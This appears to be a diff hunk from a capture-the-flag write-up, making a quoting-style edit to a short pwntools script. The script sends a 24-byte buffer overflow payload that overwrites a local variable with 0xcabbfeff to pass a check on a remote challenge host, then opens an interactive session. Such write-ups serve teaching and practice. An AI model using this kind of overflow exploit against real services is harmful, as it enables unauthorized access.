@@ -39,7 +39,7 @@ We use buffer overflow to overwrite `local_14` with 0xcabbfeff to pass the check
 ```py
 from pwn import *
 conn = remote('61.28.237.24', 30200)
-conn.sendlineafter("?", b'a' * 24 + p32(0xcabbfeff))
+conn.sendlineafter('?', b'a' * 24 + p32(0xcabbfeff))
 conn.interactive()
 ```
 
